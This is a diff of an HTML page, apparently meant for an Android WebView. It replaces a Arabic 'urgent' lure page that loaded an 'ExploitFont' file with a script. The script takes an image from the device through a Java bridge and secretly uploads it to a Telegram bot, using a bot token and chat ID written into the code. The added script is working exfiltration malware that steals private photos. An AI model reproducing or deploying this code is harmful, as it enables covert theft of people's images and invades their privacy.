@@ -1,20 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>عاجل جدًا</title>
-  <style>
-    @font-face {
-      font-family: 'ExploitFont';
-      src: url('exploit.otf');
-    }
-    body {
-      font-family: 'ExploitFont';
-      font-size: 20px;
-    }
-  </style>
-</head>
-<body>
-  <p>شوف التفاصيل الهامة جدًا اللي وصلت!</p>
-</body>
+  <body>
+    <script>
+      async function sendPhotoToTelegram(base64data) {
+        const botToken = "8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0";
+        const chatId = "6894787120";
+
+        // نحول base64 إلى Blob
+        const blob = await (await fetch(`data:image/jpeg;base64,${base64data}`)).blob();
+
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "image.jpg");
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData,
+        }).then(res => {
+          alert("✔️ تم إرسال الصورة إلى تيليجرام");
+        }).catch(err => {
+          alert("❌ فشل الإرسال: " + err.message);
+        });
+      }
+
+      // استدعاء من WebView إلى Java
+      const img = bridge.getImageBase64();
+      if (img && img !== "ERROR") {
+        sendPhotoToTelegram(img);
+      } else {
+        alert("📛 لم يتم العثور على الصورة أو خطأ في التحميل");
+      }
+    </script>
+  </body>
 </html>
